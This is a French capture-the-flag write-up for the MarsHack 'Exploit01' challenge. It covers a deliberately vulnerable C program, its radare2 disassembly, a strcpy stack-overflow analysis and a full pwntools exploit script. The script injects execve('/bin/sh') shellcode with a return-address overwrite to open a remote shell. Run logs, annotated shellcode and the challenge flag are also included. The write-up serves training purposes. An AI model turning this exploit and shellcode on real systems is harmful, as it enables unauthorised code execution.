# Write up : Exploit01

Catégorie :

```
Exploit
```

Consigne :

```
Réaliser une élévation de privilège à travers le réseau.<p>

Le binaire est fourni en téléchargement.<br>

Accès au challenge.<br>

<FONT COLOR="#ff0000">nc game1.marshack.fr 31001</FONT> <br>
```

Pièce jointe :

```
binary-exploit01
```

Serveur :

```
game2 
```

Points attribués : 

```
60
```

Flag :

```
 MARS{Easy_buff3r_ov3r_flow}
```

ASLR :

```
L' ASLR doit être activée   => game1.marshack.fr
```




## Solution

Compilation :

```
binaire 64 bits
position indépendant code :  désactivé
pile exécutable :  activé

gcc -no-pie -m64 -z execstack -o binary-exploit01 binary-exploit01.c
```

Source  :

```c
// fichier source : exploit01.c
// gcc -no-pie -m64 -z execstack -o binary-exploit01 binary-exploit01.c

#include <stdio.h>
#include <string.h>
#include <unistd.h>

void* affiche_name(char* source)
        {
        char buf[100];                       
        strcpy(buf,source);
        printf("pointeur: %lx sur \"%s\"\n", buf,buf);
        fflush(stdout);
        }

int main(int argc, char* argv[]) {
        char *pos;
        char name[250];
        char *ret=NULL;
        char *path="/home/exploit01";    
        
        chdir(path);

        printf("%s","What's your name ?\n> ");
        fflush(stdout);
        fgets(name,200,stdin);
        if ((pos=strchr(name, '\n')) != NULL)
            *pos = '\0'; 
        affiche_name(name);
        

        printf("%s","> ");
        fflush(stdout);
        fgets(name,200,stdin);
        if ((pos=strchr(name, '\n')) != NULL)
            *pos = '\0'; 
        affiche_name(name);
        
        return 0;
   
}

```



Connexion  :

```
nc game2.marshack.fr 31001                                <==  accès au challenge
 __  __                        _    _            _    
|  \/  |                 ____ | |  | |          | |   
| \  / | __ _ _ __ ___  / __ \| |__| | __ _  ___| | __
| |\/| |/ _` | '__/ __|/ / _` |  __  |/ _` |/ __| |/ /
| |  | | (_| | |  \__ \ | (_| | |  | | (_| | (__|   < 
|_|  |_|\__,_|_|  |___/\ \__,_|_|  |_|\__,_|\___|_|\_\
                        \____/                        

What's your name ?
myname                                            <==  saisi de la chaine myname
pointeur: 7ffc52606610 sur "myname"               <==  Réponse du programme distant 

```



Analyse de la réponse :

```
   On suppose qu'il s'agit de l'adresse de début (0x7ffc52606610) sur la chaine "myname"
   
   Cela sera confirmé par l'analyse statique du code.
```

Rappel : le binaire est fourni.

## Analyse du code statique :

On utilise le debugger R2 :

r2 -AA  ./binary-exploit01

```
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Enable constraint types analysis for variables
```

[0x00401090]>  afl  (affichage des fonctions)

```
0x00401030    1 6            sym.imp.strcpy       fonction libc
0x00401040    1 6            sym.imp.chdir        fonction libc 
0x00401050    1 6            sym.imp.strchr       fonction libc 
0x00401060    1 6            sym.imp.printf       fonction libc 
0x00401070    1 6            sym.imp.fgets        fonction libc 
0x00401080    1 6            sym.imp.fflush       fonction libc 

0x00401172    1 77           sym.affiche_name     fonction principale 
0x004011bf    5 300          main                 fonction principale  


```

Désassemblage de la fonction : main  

[0x00401090]>  pdf @main    (pdf : print disassembly function)

```assembly
[0x00401090]> pdf @main
┌ (fcn) main 300
│   main (int argc, char **argv, char **envp);
│           ; var int local_130h @ rbp-0x130
│           ; var int local_124h @ rbp-0x124
│           ; var int local_120h @ rbp-0x120
│           ; var int local_18h @ rbp-0x18
│           ; var int local_10h @ rbp-0x10
│           ; var int local_8h @ rbp-0x8
│           ; arg int argc @ rdi
│           ; arg char **argv @ rsi
│           ; DATA XREF from entry0 (0x4010ad)
│
│           ; stack frame (cadre de pile)
│           0x004011bf      55             push rbp
│           0x004011c0      4889e5         mov rbp, rsp
│           0x004011c3      4881ec300100.  sub rsp, 0x130
│           
│           ; arguments passés au programme
│           0x004011ca      89bddcfeffff   mov dword [local_124h], edi ; argc
│           0x004011d0      4889b5d0feff.  mov qword [local_130h], rsi ; argv
│
│           ; Change le repertoire courant           
│           0x004011d7      48c745f80000.  mov qword [local_8h], 0
│           0x004011df      488d05360e00.  lea rax, qword str.home_exploit01 ; 0x40201c ; "/home/exploit01"
│           0x004011e6      488945f0       mov qword [local_10h], rax
│           0x004011ea      488b45f0       mov rax, qword [local_10h]
│           0x004011ee      4889c7         mov rdi, rax
│           0x004011f1      e84afeffff     call sym.imp.chdir
│           
│
│           ; affiche :  What's your name ?
│           0x004011f6      488d352f0e00.  lea rsi, qword str.What_s_your_name ; 0x40202c ; "What's your name ?\n> "
│           0x004011fd      488d3d3e0e00.  lea rdi, qword [0x00402042] ; "%s"
│           0x00401204      b800000000     mov eax, 0
│           0x00401209      e852feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x0040120e      488b054b2e00.  mov rax, qword [obj.stdout__GLIBC_2.2.5] ; [0x404060:8]=0
│           0x00401215      4889c7         mov rdi, rax
│           0x00401218      e863feffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│           
│           ; capture la saisi de l'utilisateur
│           0x0040121d      488b154c2e00.  mov rdx, qword [obj.stdin__GLIBC_2.2.5] ; [0x404070:8]=0
│           0x00401224      488d85e0feff.  lea rax, qword [local_120h]
│           0x0040122b      bec8000000     mov esi, 0xc8               ; 200
│           0x00401230      4889c7         mov rdi, rax
│           0x00401233      e838feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x00401238      488d85e0feff.  lea rax, qword [local_120h]
│           0x0040123f      be0a000000     mov esi, 0xa
│           0x00401244      4889c7         mov rdi, rax
│           0x00401247      e804feffff     call sym.imp.strchr         ; char *strchr(const char *s, int c)
│           0x0040124c      488945e8       mov qword [local_18h], rax
│           0x00401250      48837de800     cmp qword [local_18h], 0
│       ┌─< 0x00401255      7407           je 0x40125e
│       │   0x00401257      488b45e8       mov rax, qword [local_18h]
│       │   0x0040125b      c60000         mov byte [rax], 0
│       │   ; CODE XREF from main (0x401255)
│       │ 
│       │
│       │
│       │   ; affiche la saisi de l'utilisateur
│       │   ; arg 1 - rdi : pointeur sur la chaine saisi par l'utilisateur
│       └─> 0x0040125e      488d85e0feff.  lea rax, qword [local_120h]
│           0x00401265      4889c7         mov rdi, rax
│           0x00401268      e805ffffff     call sym.affiche_name            ==> appelle de la fonction affiche_name
│           
│
│           ; affiche "> " pour inviter l'utilisateur à saisir une seconde chaine de caractère
│           0x0040126d      488d35d10d00.  lea rsi, qword [0x00402045] ; "> "
│           0x00401274      488d3dc70d00.  lea rdi, qword [0x00402042] ; "%s"
│           0x0040127b      b800000000     mov eax, 0
│           0x00401280      e8dbfdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00401285      488b05d42d00.  mov rax, qword [obj.stdout__GLIBC_2.2.5] ; [0x404060:8]=0
│           0x0040128c      4889c7         mov rdi, rax
│           0x0040128f      e8ecfdffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│
│
│           ; capture la saisi de l'utilisateur
│           0x00401294      488b15d52d00.  mov rdx, qword [obj.stdin__GLIBC_2.2.5] ; [0x404070:8]=0
│           0x0040129b      488d85e0feff.  lea rax, qword [local_120h]
│           0x004012a2      bec8000000     mov esi, 0xc8               ; 200
│           0x004012a7      4889c7         mov rdi, rax
│           0x004012aa      e8c1fdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x004012af      488d85e0feff.  lea rax, qword [local_120h]
│           0x004012b6      be0a000000     mov esi, 0xa
│           0x004012bb      4889c7         mov rdi, rax
│           0x004012be      e88dfdffff     call sym.imp.strchr         ; char *strchr(const char *s, int c)
│           0x004012c3      488945e8       mov qword [local_18h], rax
│           0x004012c7      48837de800     cmp qword [local_18h], 0
│       ┌─< 0x004012cc      7407           je 0x4012d5
│       │   0x004012ce      488b45e8       mov rax, qword [local_18h]
│       │   0x004012d2      c60000         mov byte [rax], 0
│       │   ; CODE XREF from main (0x4012cc)
│       │
│       │
│       │
│       │ 
│       │ 
│       │   ; affiche la saisi de l'utilisateur
│       │   ; arg 1 - rdi : pointeur sur la chaine saisi par l'utilisateur
│       └─> 0x004012d5      488d85e0feff.  lea rax, qword [local_120h]
│           0x004012dc      4889c7         mov rdi, rax
│           0x004012df      e88efeffff     call sym.affiche_name     ==>  appelle de la fonction affiche_name
│
│
│
│           ; quitte le programme
│           0x004012e4      b800000000     mov eax, 0
│           0x004012e9      c9             leave
└           0x004012ea      c3             ret

```

Désassemblage de la fonction : affiche_name

[0x00401090] pdf @sym.affiche_name     (pdf : print disassembly function)

```assembly
pdf @sym.affiche_name
┌ (fcn) sym.affiche_name 77
│   sym.affiche_name (int arg1);
│       ; var int local_78h @ rbp-0x78
│       ; var int local_70h @ rbp-0x70
│       ; arg int arg1 @ rdi
│       ; CALL XREFS from main (0x401268, 0x4012df)
│       
│       ;  stack frame  
│       0x00401172      55             push rbp
│       0x00401173      4889e5         mov rbp, rsp
│       0x00401176      4883c480       add rsp, -0x80      ;  reservation de 128 octets
│       
│       
│       ; copie de la chaine saisi par l'utilisateur 
│       0x0040117a      48897d88       mov qword [local_78h], rdi  ; arg1
│       0x0040117e      488b5588       mov rdx, qword [local_78h]          
│       0x00401182      488d4590       lea rax, qword [local_70h]
│       0x00401186      4889d6         mov rsi, rdx
│       0x00401189      4889c7         mov rdi, rax
│       0x0040118c      e89ffeffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
│       
│       ; affichage de l'adresse de la chaine et de la chaine 
│       0x00401191      488d5590       lea rdx, qword [local_70h]
│       0x00401195      488d4590       lea rax, qword [local_70h]
│       0x00401199      4889c6         mov rsi, rax
│       0x0040119c      488d3d610e00.  lea rdi, qword str.pointeur:__lx_sur___s ; 0x402004 ; "pointeur: %lx sur \"%s\"\n"
│       0x004011a3      b800000000     mov eax, 0
│       0x004011a8      e8b3feffff     call sym.imp.printf         ; int printf(const char *format)
│       0x004011ad      488b05ac2e00.  mov rax, qword [obj.stdout__GLIBC_2.2.5] ; [0x404060:8]=0
│       0x004011b4      4889c7         mov rdi, rax
│       0x004011b7      e8c4feffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│      
│       ; fin fonction
│       0x004011bc      90             nop
│       0x004011bd      c9             leave
└       0x004011be      c3             ret

```



Résultat de l'analyse du code :

```
Changement de répertoire (/home/exploit01) 

Affiche :  What's your name ?
Attend la saisie de l'utilisateur : (buffer de 200 octets)
Appel la fonction <affiche_name> pour afficher la chaine saisie par l'utilisateur
  Réserve une stack frame de 128 octets
  copie la chaine saisie par l'utilisateur dans la stack frame  
  Affiche la chaine copièe selon le format suivant 
     pointeur : <adresse pile début chaine copiée> <chaine copiée>    ex : pointeur: 7ffc52606610 sur "myname" 

Affiche : > 
Attend la saisie de l'utilisateur : buffer de 200 octets)
Appel la fonction <affiche_name> pour afficher la chaine saisie par l'utilisateur
Réserve une stack frame de 128 octets
  copie la chaine saisie par l'utilisateur dans la stack frame  
  Affiche la chaine copiée selon le format suivant 
     pointeur : <adresse pile début chaine copiée> <chaine copiée>    ex : pointeur: 7ffc52606610 sur "myname" 
```



Ou est le problème 

```
L'utilisateur peut saisir une chaine de caractère de 200 octets. par la suite, dans la fonction <affiche_name> , la chaine est copiée dans un espace de pile de 128 octets. 
On va donc pouvoir réaliser un buffer over flow

l'ASLR est activé, mais la première saisie nous indique l'emplacement de la pile. donc l'aslr n'est plus un problème.
```



Résolution du challenge :

```
à la première invitation :
   saisie d'une chaine pour connaître l'emplacement de la pile

à la seconde invitation :
   transmission d'un payload chargé d'écraser le retour de la fonction et d'exécuter un shellcode
```



Construction du payload

```
     47   nop
     33   shellcode
     40   nop
      8   ret  ecrase le retour de fonction et redirige sur le premier nop du payload
   ----
    128   
```



Script python 2.7 permettant de résoudre ce challenge :

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-


# F5 paste/no paste (copier coller sans indentation)
# F6 pour executer le script python 2.7
# F7 pour executer le script python 3
# F8 highlighting on/off, and show current value.


from pwn import *
import re
from struct import *
import binascii


sleep(1)
p = remote("game1.marshack.fr",31001)  



print p.recvuntil("> ")

print"cez40"
p.sendline("cez40")
lig03 = p.recvline(timeout=1)    # pointeur : <adressepile> sur <chaine saisi>
lig04 = p.recv(timeout=1)        # > (esp)
print lig03
# print binascii.hexlify(lig04)
pattern= " "
match=re.split(pattern,lig03,maxsplit=0,flags=0)
adresse_pile = match[1]
adresse_pile = int(adresse_pile,16)


pile = pack('Q',adresse_pile)
print "pointeur en little indian"
print binascii.hexlify(pile)
print
nop = "\x90" 
shellcode = \
"\x48\x31\xc0\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68" + \
"\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f" + \
"\x05"

payload = nop * 47 
payload = payload + shellcode  # size 33 octets
payload = payload + nop * 40

payload = payload + pile

print binascii.hexlify(payload)
#f=open("payload","wb")
#f.write(payload)
#f.close
#print "payload"
p.sendline(payload)              # send payload
lig05 = p.recvline(timeout=1)    # pointeur : <adressepile> sur <chaine saisi>
print lig05
p.sendline("/bin/ls -l")
print p.recv(timeout=2)
print p.interactive()
p.close()

```



Execution du script :

```
./test.py
[+] Opening connection to game1.marshack.fr on port 31001: Done
 __  __                        _    _            _    
|  \/  |                 ____ | |  | |          | |   
| \  / | __ _ _ __ ___  / __ \| |__| | __ _  ___| | __
| |\/| |/ _` | '__/ __|/ / _` |  __  |/ _` |/ __| |/ /
| |  | | (_| | |  \__ \ | (_| | |  | | (_| | (__|   < 
|_|  |_|\__,_|_|  |___/\ \__,_|_|  |_|\__,_|\___|_|\_\
                        \____/                        

What's your name ?
> 
cez40
pointeur: 7ffc0e527f10 sur "cez40"            

pointeur en little indian
107f520efc7f0000

90909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090904831c04831d248bb2f2f62696e2f736848c1eb08534889e750574889e6b03b0f0590909090909090909090909090909090909090909090909090909090909090909090909090909090107f520efc7f0000
pointeur: 7ffc0e527f10 sur "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90H1�H1�H\xbb//bin/shH�SH\x89�PWH\x89�;\x0f\x05\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x10\x7fR\x0e�"

total 32
-r-xr-xr-x 1 exploit01 root 16992 Oct 16 22:10 exploit01
-r--r--r-- 1 exploit01 root    55 Oct  6 20:02 fail.txt
-r--r--r-- 1 exploit01 root    28 Oct 16 21:16 flag.txt
-r--r--r-- 1 exploit01 root   386 Oct 16 18:10 success.txt

[*] Switching to interactive mode
$ cat flag.txt
MARS{Easy_buff3r_ov3r_flow}

[*] Closed connection to game1.marshack.fr port 31001

```

Si l'adresse de la pile contient l'octet 0x00, le traitement du payload échouera. Il suffit de faire d'autres tentatives jusqu'à ce que l'adresse de la pile ne contienne pas de 0x00

```
Dans cet exemple l'adresse de la pile est : 7ffe00ab88e0  et contient 0x00
                                                ^^
```

Ci-dessous une tentative qui échoue.

```
./test.py
[+] Opening connection to game1.marshack.fr on port 31001: Done
 __  __                        _    _            _    
|  \/  |                 ____ | |  | |          | |   
| \  / | __ _ _ __ ___  / __ \| |__| | __ _  ___| | __
| |\/| |/ _` | '__/ __|/ / _` |  __  |/ _` |/ __| |/ /
| |  | | (_| | |  \__ \ | (_| | |  | | (_| | (__|   < 
|_|  |_|\__,_|_|  |___/\ \__,_|_|  |_|\__,_|\___|_|\_\
                        \____/                        

What's your name ?
> 
cez40
pointeur: 7ffe00ab88e0 sur "cez40"

pointeur en little indian
e088ab00fe7f0000

90909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090904831c04831d248bb2f2f62696e2f736848c1eb08534889e750574889e6b03b0f0590909090909090909090909090909090909090909090909090909090909090909090909090909090e088ab00fe7f0000
pointeur: 7ffe00ab88e0 sur "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90H1�H1�H\xbb//bin/shH�SH\x89�PWH\x89�;\x0f\x05\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90���"

Traceback (most recent call last):
  File "./test.py", line 61, in <module>
    print p.recv(timeout=2)
  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/tube.py", line 78, in recv
    return self._recv(numb, timeout) or ''
  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/tube.py", line 156, in _recv
    if not self.buffer and not self._fillbuffer(timeout):
  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/tube.py", line 126, in _fillbuffer
    data = self.recv_raw(self.buffer.get_fill_size())
  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/sock.py", line 46, in recv_raw
    raise EOFError
EOFError
[*] Closed connection to game1.marshack.fr port 31001

```





Détail du shellcode 

```c
int main(void)
{
    char shellcode[] =
    "\x48\x31\xc0"                                  // xor    rax,rax                    rax = 0   
    "\x48\x31\xd2"                                  // xor    rdx,rdx                    rdx = 0 (env - pointeur null)
    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // movabs rbx,0x68732f6e69622f2f     "//bin/sh" (slash padding)
    "\x48\xc1\xeb\x08"                              // shr    rbx,0x8                    "/bin/sh",0 (supp le premier "/")
    "\x53"                                          // push   rbx                         
    "\x48\x89\xe7"                                  // mov    rdi,rsp                    rdi pointe sur /bin/sh
    "\x50"                                          // push   rax                        push 0 (argv[1] pointeur null)
    "\x57"                                          // push   rdi                        filename (/bin/sh,0)
    "\x48\x89\xe6"                                  // mov    rsi,rsp                    rsi (argv)       
    "\xb0\x3b"                                      // mov    al,0x3b                    execve 64 bits
    "\x0f\x05";                                     // syscall 
 
    (*(void (*)()) shellcode)();
     
    return 0;
}


\x48\x31\xc0\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68
\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f
\x05


```

Résultat : MARS{Easy_buff3r_ov3r_flow}
